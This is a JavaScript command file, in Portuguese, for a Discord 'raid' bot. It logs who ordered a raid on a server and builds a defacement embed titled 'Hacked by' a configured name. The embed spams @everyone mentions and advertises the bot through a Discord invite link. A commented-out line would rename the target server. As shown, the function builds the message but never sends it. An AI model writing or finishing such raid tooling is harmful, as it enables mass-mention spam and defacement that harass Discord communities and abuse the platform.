const discord = require("discord.js");
const nome = require("./Nome.json").nome;
exports.run = async (client, message, args) => {
    console.log("Raid Executado No Servidor: " + message.guild.name + " | Quem Ordenou O Raid: " + message.author.username + ` | Id De ${message.author.username}: ${message.author.id}`)
    //message.guild.setName(`Hackeado Por ${arg}`)
    let Title = "Hackeado Por " + nome
    let Description = "@everyone @everyone @everyone @everyone @everyone @everyone"
    let field = "Quer Ter Esse Bot De Raid?"
    let fieldd = "Link Servidor: https://discord.gg/x9jqsb" // descricão do field
    function raid(){
   const embed = new discord.RichEmbed()
   .setTitle(Title)
   .setColor("RANDOM")
   .setDescription(Description)
   .setImage("https://media.tenor.com/images/71656fc182ad63d50fbcd7c5496aa09d/tenor.gif")
   .addField(field, fieldd)
  }
   raid()
}